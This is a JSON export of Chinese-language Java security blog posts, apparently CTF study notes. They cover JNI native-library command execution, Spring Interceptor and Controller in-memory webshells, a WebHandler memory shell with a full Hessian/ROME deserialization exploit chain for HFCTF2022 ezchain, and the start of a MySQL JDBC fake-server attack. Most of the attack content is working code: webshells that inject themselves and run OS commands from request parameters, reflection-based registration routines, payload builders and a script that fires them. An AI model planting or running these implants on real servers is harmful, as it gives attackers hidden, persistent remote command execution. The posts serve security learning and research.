[{"title":"JNI","url":"/2025/05/03/JNI/","content":"利用手法目前知道的有两种，一种是.c直接编译成.dll；第二种是得到.h后编写对应.c，然后编译成.jnilib\n.c直接编译#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;//加载进内存前执行__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;calc&quot;);&#125;\n\ngcc -shared -fPIC qwq.c -o hack.dll\npublic class Native &#123;    public native String exec(String cmd);&#125;\n\npublic class dll_Loader &#123;    public static void main(String[] args) &#123;        //加载根源的.dll，即.c文件直接编译的        System.load(&quot;your_path/poc.dll&quot;);        Native aNative = new Native();        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n.jnilib这里写.jnilib只是为了便于区分，实际上.jinlib一般用与Mac，.dll用于windows，.so用于linux。根据情况选择\n先写Native.java\njavac Native.java 得到.class\njavah -jni Native 得到.h，注意，jdk10以后没有javah命令，需要换一下；Native的位置写完整包名\n然后编写包含.h的.c文件：\n#include &lt;jni.h&gt; // JNI 头文件#include &lt;stdlib.h&gt; // 提供 popen 和 pclose 函数#include &lt;stdio.h&gt; // 提供 fgets 和 FILE 操作#include &lt;string.h&gt; // 提供字符串操作函数#include &quot;Native.h&quot; // 假设这是 JNI 的头文件//命名规则：Java_类的全限定名_方法名JNIEXPORT jstring JNICALL Java_Native_exec(JNIEnv *env, jclass clazz, jstring str) &#123;    if (str != NULL) &#123;        jboolean isCopy;        // 将 jstring 参数转成 char 指针        const char *cmd = (*env)-&gt;GetStringUTFChars(env, str, &amp;isCopy);        if (cmd != NULL) &#123;            // 使用 popen 函数执行系统命令            FILE *fd = popen(cmd, &quot;r&quot;);            if (fd != NULL) &#123;                // 定义缓冲区和结果字符串                char buf[128];                char result[4096] = &#123;0&#125;; // 用于存储命令执行结果                // 读取 popen 的执行结果                while (fgets(buf, sizeof(buf), fd) != NULL) &#123;                    // 将读取到的内容拼接到结果字符串中                    strcat(result, buf);                &#125;                // 关闭 popen                pclose(fd);                // 返回命令执行结果给 Java                jstring ret = (*env)-&gt;NewStringUTF(env, result);                (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 释放字符串资源                return ret;            &#125;            (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 如果 popen 失败，也要释放字符串资源        &#125;    &#125;    return NULL; // 如果输入为空或执行失败，返回 NULL&#125;\n\n执行 gcc -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include” -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include\\win32” -shared -o poc.jnilib Native.c\n得到.jnilib\npublic class Native_Caller &#123;    public static void main(String[] args) &#123;        Native aNative = new Native();        System.load(&quot;your_path\\\\poc.jnilib&quot;);        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n三种.jnilib加载的方法\n        //加载方法1//        File file = new File(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);//        Method method = ClassLoader.class.getDeclaredMethod(&quot;loadLibrary0&quot;, Class.class, File.class);//        method.setAccessible(true);        //这个Native.class一般不会存在于服务器，需要我们通过字节码去加载//        method.invoke(Thread.currentThread().getContextClassLoader(), Native.class, file);        //加载方法2        System.load(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);        //加载方法3，失败//        Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;);//        Method method1 = aClass.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class, boolean.class);//        method1.setAccessible(true);//        method1.invoke(null, file.getAbsolutePath(), false, false);\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Interceptor内存马","url":"/2025/05/04/SpringBoot-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里主要讲一下SpringBoot里的各种组件和它们的作用与关系。首先需要知道什么是SpringMVC。MVC就是Model-View-Controller。SpringBoot中内置了SpringMVC，并帮助你把一些繁琐的配置做好了(不需要写web.xml)，使程序员只需要关注业务代码。SpringMVC里有几个重要的部分，分别是DispatcherServlet，HandlerAdapter，Handler。下面简单介绍一下。先看一张图，建立基本认识：\n下面的内容是我问AI的，还挺清楚，大家有什么不懂的也可以直接问AI。\n首先是HandlerAdapter和Handler：在 Spring MVC 中，HandlerAdapter 和 Handler 是两个非常重要的概念，它们在请求处理过程中扮演着不同的角色。为了更好地理解它们的区别和作用，我们先分别解释一下这两个概念，然后再对比它们的不同之处。\nHandler&amp;HandlerAdapter\nHandler（处理器）\n定义：Handler 是一个接口，表示能够处理 HTTP 请求的对象。它通常是控制器（Controller）的一个实例，负责处理特定的 URL 请求。\n功能：Handler 的主要职责是根据传入的请求参数执行相应的业务逻辑，并返回一个 ModelAndView 或其他类型的响应结果。\n实现方式：\n在 Spring MVC 中，最常见的是使用注解驱动的控制器（如 @Controller 或 @RestController），这些控制器类就是 Handler 的具体实现。\n除了注解驱动的方式，Spring MVC 还支持基于接口的控制器（如 Controller 接口），但这种方式已经较少使用。示例：@Controllerpublic class MyController {  @GetMapping(“&#x2F;hello”)public String hello(Model model) {model.addAttribute(“message”, “Hello, World!”);return “hello”;  &#x2F;&#x2F; 返回视图名称}\n\n}\n在这个例子中，MyController 就是一个 Handler，它处理 &#x2F;hello 路径的 GET 请求。\n\nHandlerAdapter（处理器适配器）\n定义：HandlerAdapter 是一个接口，它的作用是将不同类型的 Handler 统一为一种标准的处理方式。它负责调用具体的 Handler 并处理请求。\n功能：HandlerAdapter 的主要职责是将请求交给合适的 Handler 处理，并将处理结果转换为 ModelAndView 或其他响应形式。它充当了框架与具体处理器之间的桥梁。\n实现方式：\nSpring MVC 内置了多种 HandlerAdapter 实现，用于处理不同类型的 Handler。例如：\nRequestMappingHandlerAdapter：用于处理基于注解的控制器（如 @Controller、@RestController）。\nSimpleControllerHandlerAdapter：用于处理实现了 Controller 接口的传统控制器。\nHttpRequestHandlerAdapter：用于处理实现了 HttpRequestHandler 接口的处理器。示例：@RequestMappingHandlerAdapter adapter &#x3D; new RequestMappingHandlerAdapter();adapter.handle(request, response, handler);\n\n在这个例子中，RequestMappingHandlerAdapter 是一个 HandlerAdapter，它负责调用注解驱动的控制器来处理请求。\n\nHandler 和 HandlerAdapter 的区别\n特性Handler（处理器）HandlerAdapter（处理器适配器）角色具体的请求处理者调用并适配不同的 Handler职责执行业务逻辑，处理请求将请求分发给合适的 Handler类型可以是注解驱动的控制器、命令对象等是一个适配器，负责统一处理流程数量可以有多个 Handler通常只有一个或少数几个 HandlerAdapter调用关系Handler 由 HandlerAdapter 调用HandlerAdapter 由 DispatcherServlet 调用\n\n\n工作流程\n在 Spring MVC 中，请求的处理流程如下：1.请求到达：用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：DispatcherServlet 使用 HandlerMapping 来查找匹配的 Handler。3.调用 HandlerAdapter：找到合适的 Handler 后，DispatcherServlet 会使用 HandlerAdapter 来调用该 Handler。4.处理请求：HandlerAdapter 调用具体的 Handler，执行业务逻辑。5.返回结果：Handler 处理完请求后，返回一个 ModelAndView 或其他类型的响应结果。6.渲染视图：DispatcherServlet 根据返回的结果选择合适的视图进行渲染，并将响应返回给客户端。\n\n\n总结\nHandler 是实际处理请求的对象，通常是控制器类，负责执行业务逻辑。\nHandlerAdapter 是一个适配器，它负责将请求分发给合适的 Handler，并确保所有类型的 Handler 都能以统一的方式被调用。简单来说，HandlerAdapter 是一个中间层，它使得 Spring MVC 可以灵活地支持多种类型的 Handler，而不需要改变核心的请求处理流程。\nDispatcherServlet然后是DispatcherServlet：DispatcherServlet 是 Spring MVC 框架中的核心组件，它是整个 Web 请求处理流程的前端控制器（Front Controller）。所有的 HTTP 请求都会通过 DispatcherServlet 进行分发和处理。它负责协调 Spring MVC 的各个组件，完成从请求到响应的整个生命周期管理。\n\n\nDispatcherServlet 的作用DispatcherServlet 的作用\n统一入口：DispatcherServlet 是 Spring MVC 的前端控制器，所有的 HTTP 请求都会被转发到这里。\n请求分发：根据请求的 URL 和配置，DispatcherServlet 负责将请求分发给合适的处理器（Handler）。\n组件协作：DispatcherServlet 协调了 Spring MVC 中的多个组件（如 HandlerMapping、HandlerAdapter、ViewResolver 等），确保请求能够被正确处理并返回响应。\n\n\nDispatcherServlet 的工作流程\n当一个 HTTP 请求到达时，DispatcherServlet 的主要工作流程如下：1.接收请求：\n用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：\nDispatcherServlet 使用 HandlerMapping 来查找能够处理该请求的 Handler（处理器）。\nHandlerMapping 根据请求的 URL、HTTP 方法等信息，匹配到对应的 Handler。3.调用 HandlerAdapter：\n找到合适的 Handler 后，DispatcherServlet 使用 HandlerAdapter 来调用该 Handler。\nHandlerAdapter 是一个适配器，负责调用不同类型的 Handler 并统一返回结果。4.执行业务逻辑：\nHandler（通常是控制器类）执行具体的业务逻辑，并返回一个 ModelAndView 对象，其中包含模型数据和视图名称。5.解析视图：\nDispatcherServlet 使用 ViewResolver 将视图名称解析为具体的视图对象（如 JSP、Thymeleaf 等）。6.渲染视图：\n视图对象根据模型数据进行渲染，生成最终的 HTML 页面或其他形式的响应内容。7.返回响应：\n渲染完成后，DispatcherServlet 将响应内容返回给客户端。\n\n\nDispatcherServlet 的初始化\n在应用程序启动时，DispatcherServlet 会被初始化。它的初始化过程包括以下几个步骤：1.加载 WebApplicationContext：\nDispatcherServlet 会创建并加载一个独立的 Web 应用上下文（WebApplicationContext），用于存储与 Web 相关的 Bean。2.注册组件：\n初始化过程中，DispatcherServlet 会注册一系列关键组件，例如：\nHandlerMapping：用于匹配请求和处理器。\nHandlerAdapter：用于调用处理器。\nViewResolver：用于解析视图名称。\n其他组件（如异常处理器、拦截器等）。3.准备就绪：\n初始化完成后，DispatcherServlet 准备好接收和处理 HTTP 请求。\n\n\nDispatcherServlet 的配置在传统的 Spring MVC 项目中，DispatcherServlet 通常通过 web.xml 配置文件进行声明。例如：\n&lt;servlet&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\n在 Spring Boot 中，DispatcherServlet 的配置被自动简化，开发者不需要手动编写 web.xml 文件。Spring Boot 会自动配置 DispatcherServlet 并将其映射到 &#x2F; 路径。\nDispatcherServlet 的重要性\n单一入口：DispatcherServlet 是整个 Spring MVC 请求处理流程的起点，所有的请求都必须经过它。\n解耦设计：通过 DispatcherServlet，Spring MVC 实现了请求处理的解耦设计，使得框架可以灵活扩展。\n可扩展性：开发者可以通过自定义 HandlerMapping、HandlerAdapter 或 ViewResolver 等组件，来实现特定的需求。\n\n总结DispatcherServlet 是 Spring MVC 的核心组件，作为前端控制器，它负责接收请求、分发请求、协调组件以及返回响应。它的存在使得 Spring MVC 的请求处理流程清晰且高效，同时提供了高度的灵活性和可扩展性。\n流程分析这里我们做分析的目的，主要是为了知道哪里添加了Interceptor，调用了Interceptor的preHandle方法。\n如上图，直接在DispatcherServlet#doDispatch断点。箭头所指处， 就是开头那张图片的第一步，请求查询Handler，我们跟进。\n继续跟进上图中的getHandler。\n来到了AbstractHandlerMapping，我们继续跟进getHandlerExecutionChain。\n这里就是add Interceptor的地方了。这下我们的目标其实也明确了。通过反射拿到AbstractHandlerMapping的adaptedInterceptor属性，向这个属性里添加我们的interceptor。那么怎么拿到当前代码环境下的，也就是当前上下文里的AbstractHandlerMapping呢？通过获取WebApplicationContext可以做到。\n如上图，回到doDispatch，这里的mappedHandler就是一开始图片里的HandlerExectionChain。这里面包括两个interceptors和处理这个http请求需要用到的controller方法。\n如上图，第一个箭头拿HandlerAdapter，第二个调用Interceptor中的preHandle方法，第三个就是调用controller中的对应方法。这里不讲了，可以自己跟进看一下。\n下面这段可以作为反序列化sink的字节码动态加载。\npackage interceptor;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;//作为反序列化sink动态加载的字节码public class BadInterceptor extends HandlerInterceptorAdapter &#123;    public BadInterceptor() &#123;        try &#123;            //获得context            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            //获取 adaptedInterceptors 属性值            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(&quot;requestMappingHandlerMapping&quot;);            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);            field.setAccessible(true);            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);            BadInterceptor aaa = new BadInterceptor(&quot;aaa&quot;);            adaptedInterceptors.add(aaa);        &#125;catch (Exception e)&#123;&#125;    &#125;    public BadInterceptor(String aaaa)&#123;&#125;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String code = request.getParameter(&quot;bad&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;            return false;        &#125;        return true;    &#125;&#125;\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Controller内存马","url":"/2025/05/05/SpringBoot-Controller%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里需要了解Spring IoC，Bean，ApplicationContext是什么。\n基本名词概念Spring IoC（Inversion of Control，控制反转）容器是Spring框架的核心组件之一，它负责管理应用程序中对象的创建、配置和生命周期。通过IoC容器，Spring实现了依赖注入（Dependency Injection, DI），从而降低了组件之间的耦合度，提高了代码的可维护性和可测试性。\nSpring IoC 容器主要功能\n对象的实例化：IoC容器会根据配置文件（如XML、Java注解或Java配置类）来创建对象实例。\n对象的配置：容器不仅负责创建对象，还会根据配置为对象设置属性值或注入依赖。\n对象的装配：容器会根据配置将不同的对象装配在一起，形成完整的应用上下文。\n对象的生命周期管理：容器可以管理对象的生命周期，包括初始化、运行时管理和销毁。\n\nSpring IoC 容器的实现方式Spring提供了两种主要的IoC容器实现：\n\nBeanFactory：这是Spring IoC容器的基础接口，提供基本的依赖注入功能。它是轻量级的，适合资源受限的环境。\nApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能，例如事件传播、国际化支持、AOP支持等。ApplicationContext是更常用的IoC容器实现。\n\n配置方式Spring IoC容器可以通过以下几种方式进行配置：\n\n基于XML的配置：使用XML文件定义Bean及其依赖关系。\n基于注解的配置：使用如@Component、@Service、@Autowired等注解来声明Bean和依赖注入。\n基于Java配置：使用@Configuration和@Bean注解以编程方式定义Bean。\n\n示例以下是一个简单的基于注解的Spring IoC容器示例：\n// 定义一个服务类，并使用 @Service 注解将其注册为 Bean@Servicepublic class MyService &#123;    public void execute() &#123;        System.out.println(&quot;MyService is executing...&quot;);    &#125;&#125;// 主程序类public class MainApp &#123;    public static void main(String[] args) &#123;        // 创建 Spring 应用上下文        ApplicationContext context = new AnnotationConfigApplicationContext(MainApp.class);        // 从容器中获取 MyService Bean        MyService myService = context.getBean(MyService.class);        myService.execute();    &#125;&#125;\n\n在这个例子中，MyService被注册为一个Bean，并通过IoC容器进行管理。主程序通过context.getBean()方法从容器中获取MyService实例。\n看完之后，我的理解是：\n1、Bean是Spring框架中的对象，而IoC是Bean的管理者\n2、IoC主要有两种实现方式，最基础的是BeanFactory，而它的一个重要子类是ApplicationContext\n3、如果我们能够获取IoC，比如ApplicationContext，那么我们就可以得到任何Bean，也就是得到某次请求中的Context中的任意对象\n这里简单解释一下Context。Context是上下文的意思，而上下文可以简单理解成一个进程运行时，各个类里面的变量等一切和这个进程有关的东西。\n分析之前是分析过Interceptor内存马的，所以我这里直接给EXP。这个EXP适用于springboot&lt;2.6.0\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 beanRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);// 2. 通过反射获得自定义 controller 中唯一的 Method 对象Method declaredMethod = Class.forName(&quot;bad_controller.BadController&quot;).getDeclaredMethods()[0];// 3. 定义访问 controller 的 URL 地址PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shellCon&quot;);// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();// 5. 在内存中动态注册 controllerRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(&quot;bad_controller.BadController&quot;).newInstance(), declaredMethod);return &quot;/shellCon has been added&quot;;\n\n这里获取上下文的方法还是一样。主要看看怎么动态注册Controller。\n还记得Interceptor里的那张图吗？DispatcherServlet先去跟HandlerMapping拿到对应的Controller里的方法和Interceptor，再进行后续处理。所以Controller里的方法是在HandlerMapping里被取出的，所以我们需要重点关注HandlerMapping。\n概括一下，先拿到HandlerMapping，再拿到Controller，再拿到Controller里具体的方法，再拿到路由和请求方式，最后注册即可。\nSpringBoot&gt;&#x3D;2.6.0的EXP：\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);configField.setAccessible(true);RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);Method method2 = InjectToController2.class.getMethod(&quot;test&quot;);RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();InjectToController2 springControllerMemShell = new InjectToController2(&quot;aaa&quot;);mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);\n\n内存马：\npackage bad_controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Controllerpublic class BadController &#123;    public void badCon(HttpServletRequest request, HttpServletResponse response) &#123;        String code = request.getParameter(&quot;cmd&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;        &#125;    &#125;&#125;\n\n总结这里我只写了一种注册Controller的方法，获取context的过程也没细讲，可以去看参考文章里的。\n参考基于内存 Webshell 的无文件攻击技术研究-安全KER - 安全资讯平台\nSpring内存马学习\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"WebHandler内存马","url":"/2025/05/05/WebHandler%E5%86%85%E5%AD%98%E9%A9%AC/","content":"主要结合HFCTF2022-ezchain讲\n前言这里的hessian链比较容易，用原生jdk就可以打。不过这里不出网，所以要注入内存马，也就是需要加载字节码。这样原生jdk链虽然可以，但是比较繁琐。这里给了ROME链，就结合ROME链打一个二次反序列化。内存马是WebHandler，不太常见，学习一下。\n解题这里偷懒，照搬别人的了。\n首先是一个简单的hash碰撞，跟进去找到hashcode的计算方法：\n逻辑很简单，乘31后加就是。看最后两位，只要满足31a+b&#x3D;31c+d就行了，其中a&#x3D;50，b&#x3D;50，手算一个就行。这里找到其中一个，HFCTF201Q。\n接下来就是hessian反序列化。这里复现的时候一开始依赖没下完整，以为是打原生jdk，后来才看到有rome链。这里rome链直接放别人的了。\n二次反序列化Rome链SignedObject二次反序列化已经比较熟悉了。\n这里主要看看WebHandler内存马怎么写。\n正常基于tomcat和spring的内存马都是通过上下文来获取request对象，本题目直接使用http handler搭建服务，我们该如何实现动态注册呢？\n按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过Thread.currentThread()或Thread.getThreads()获取。\nThread.currentThread()–&gt;group–&gt;threads[1]–&gt;target–&gt;this$0–&gt;contexts–&gt;list[0]–&gt;handler\n内存马：\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;public class memoryshell extends AbstractTranslet implements HttpHandler &#123;    static &#123;        //获取当前线程        Object o = Thread.currentThread();        try &#123;            Field groupField = o.getClass().getDeclaredField(&quot;group&quot;);            groupField.setAccessible(true);            Object group = groupField.get(o);            Field threadsField = group.getClass().getDeclaredField(&quot;threads&quot;);            threadsField.setAccessible(true);            Object t = threadsField.get(group);            Thread[] threads = (Thread[]) t;            for (Thread thread : threads)&#123;                if(thread.getName().equals(&quot;Thread-2&quot;))&#123;                    Field targetField = thread.getClass().getDeclaredField(&quot;target&quot;);                    targetField.setAccessible(true);                    Object target = targetField.get(thread);                    Field thisField = target.getClass().getDeclaredField(&quot;this$0&quot;);                    thisField.setAccessible(true);                    Object this$0 = thisField.get(target);                    Method createContext = Class.forName(&quot;sun.net.httpserver.ServerImpl&quot;).getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class);                    createContext.setAccessible(true);                    createContext.invoke(this$0,&quot;/shell&quot;,new memoryshell());                                    &#125;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public void handle(HttpExchange t) throws IOException &#123;        String response = &quot;MemoryShell&quot;;        String query = t.getRequestURI().getQuery();        String[] var3 = query.split(&quot;=&quot;);        ByteArrayOutputStream output = null;        if (var3[0].equals(&quot;cmd&quot;))&#123;            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();            output = new ByteArrayOutputStream();            byte[] buffer = new byte[4096];            int n = 0;            while (-1 != (n = inputStream.read(buffer))) &#123;                output.write(buffer, 0, n);            &#125;        &#125;        response+=(&quot;\\n&quot;+new String(output.toByteArray()));        t.sendResponseHeaders(200, (long)response.length());        OutputStream os = t.getResponseBody();        os.write(response.getBytes());        os.close();    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\nEXP:\npackage com.ctf.ezchain;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;import javax.xml.transform.Templates;public class memEXP &#123;    //为类的属性设置值    public static void setValue(Object target, String name, Object value) throws Exception &#123;        Field field = target.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(target,value);    &#125;    public static HashMap getObject() throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\memshell\\\\memoryshell.class&quot;));        setValue(templates,&quot;_name&quot;, &quot;aaa&quot;);        setValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytecodes&#125;);        setValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());        //构造ToStringBean        ToStringBean toStringBean=new ToStringBean(Templates.class,templates);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        //构造ObjectBean        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        //构造HashMap        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        //反射修改字段        Field obj=EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        return  hashMap;    &#125;    public static void main(String[] args) throws Exception &#123;        HashMap evilhashMap=getObject();        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(evilhashMap,privateKey,signingEngine);        ToStringBean toStringBean=new ToStringBean(SignedObject.class,signedObject);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        Field obj= EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        Hessian2Output hessianOutput1 = new Hessian2Output(new FileOutputStream(&quot;D:\\\\tmp\\\\payload.bin&quot;));        hessianOutput1.writeObject(hashMap);        hessianOutput1.close();    &#125;&#125;\n\npython:\nimport requests url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/?token=GeCTF2022&quot; with open(&quot;hession.ser&quot;, &quot;rb&quot;) as f:    content = f.read() requests.post(url=url, data=content) url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/shell?cmd=cat /flag&quot;text = requests.get(url).textprint(text)\n\nUnixPrintService链这个这里先不讲了，之后单独开一篇文章\n参考CTF | 2022HFCTF ezchain\n2022虎符CTF-Java部分\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"MySQL JDBC Attack常规打法及绕过","url":"/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/","content":"不出网打法https://xz.aliyun.com/news/17830\n由m4x师傅最先发现，原理文章中已经详细介绍，这里简单概括一下。\n原理概述概况：在连接参数中指定socketFactory为NamedPipeSocketFactory。此工厂会打开一个文件，并且最终使用这个文件流作为与服务器连接的IO通道，最终实现本地化的mysql通讯，就跟我们打远程jdbc一样。\n这里以5.1.47 的驱动为例。\nMysqlIO是一个重要的初始化类：\n\n重点关注socketFactoryClassName。赋值后，执行了createSocketFactory方法：\n\n这个方法会初始化上面的socketFactoryClassName，并且socketFactoryClassName必须是SocketFactory的实现。\n看一下这个接口有哪些实现:\n\nStandardSocketFactory是socketFactoryClassName的默认值，因为：\n\n而我们这里关注NamedPipeSocketFactory。\n回头看一下，createSocketFactory()后，会调用对应工厂的connect()：\n\n\n可以看到，namedPipePath是从props里获取的。跟进看一下NamePipeSocket的构造方法：\n\n这里打开了一个文件，并且最终使用这个文件流作为与服务器连接的IO通道。\n回头看一下props是否可控，发现可以的，就是jdbc url里的连接参数。\npcap正常生成主要讲一下我在pcap生成时遇到的问题。\n先给出正确的生成流程。\n开启fakeServer：\n# coding=utf-8import socketimport binasciiimport osgreeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;response_ok_data=&quot;0700000200000002000000&quot;def receive_data(conn):    data = conn.recv(1024)    print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data))    return str(data).lower()def send_data(conn,data):    print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data))    conn.send(binascii.a2b_hex(data))def get_payload_content():    #file文件的内容使用ysoserial生成的 